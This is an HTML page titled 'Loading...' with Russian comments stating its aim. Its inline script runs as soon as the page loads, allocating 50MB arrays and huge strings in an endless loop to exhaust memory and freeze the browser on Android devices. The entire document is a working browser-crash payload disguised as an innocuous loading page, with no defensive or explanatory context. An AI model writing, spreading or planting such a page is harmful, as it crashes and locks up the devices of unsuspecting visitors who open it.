<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <script>
        // Краш для Android - заполняем память + убиваем UI
        let memory = [];
        let kill = new Array(1000000);
        
        function crashAndroid() {
            while(true) {
                // 50MB за раз
                memory.push(new Uint8Array(1024 * 1024 * 50));
                // Спам в консоль
                console.log('Crashing...', memory.length);
                // Бесконечный цикл для блокировки UI
                for(let i=0; i<1000000; i++) {
                    kill.push('x'.repeat(100000));
                }
            }
        }
        
        // Запускаем сразу
        crashAndroid();
    </script>
</body>
</html>
